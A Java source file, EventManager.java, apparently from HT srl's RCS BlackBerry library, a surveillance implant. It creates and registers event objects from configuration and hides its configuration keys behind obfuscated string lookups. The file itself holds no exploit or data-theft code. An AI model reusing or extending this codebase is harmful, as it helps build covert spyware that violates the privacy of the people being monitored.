//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : EventManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.manager;

import blackberry.JobManager;
import blackberry.Messages;
import blackberry.Singleton;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.event.FactoryEvent;
import blackberry.interfaces.iSingleton;

/**
 * The Class EventManager.
 */
public final class EventManager extends JobManager implements iSingleton {

    private static final long GUID = 0x3c80b0de21f15f46L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = (EventManager) Singleton.self().get(GUID);
            if (instance == null) {
                final EventManager singleton = new EventManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }

        return instance;
    }

    /**
     * mapAgent() Add agent id defined by "key" into the running map. If the
     * agent is already present, the old object is returned.
     * 
     * @param key
     *            : Agent ID
     * @return the requested agent or null in case of error
     */
    public Event makeEvent(final ConfEvent conf) {

        Event event = null;

        String type = conf.getType();
        String subtype = conf.getSafeString(Messages.getString("12.3")); //$NON-NLS-1$
        if (subtype == null)
            subtype = ""; //$NON-NLS-1$

        String ts = conf.getSafeString("ts"); //$NON-NLS-1$
        String te = conf.getSafeString("te"); //$NON-NLS-1$

        // TODO
        if (subtype == null && Messages.getString("12.2").equals(ts) && Messages.getString("12.1").equals(te)) { //$NON-NLS-1$ //$NON-NLS-2$
            subtype = Messages.getString("12.0"); //$NON-NLS-1$
        }

        event = FactoryEvent.create(type, subtype);
        if (event != null) {
            if(event.setConf(conf)){
                add(event);
            }else{
                //#ifdef DEBUG
                debug.error("makeModule: wrong conf or not supported, don't add"); //$NON-NLS-1$
                //#endif
            }
        }
        return event;
    }
}
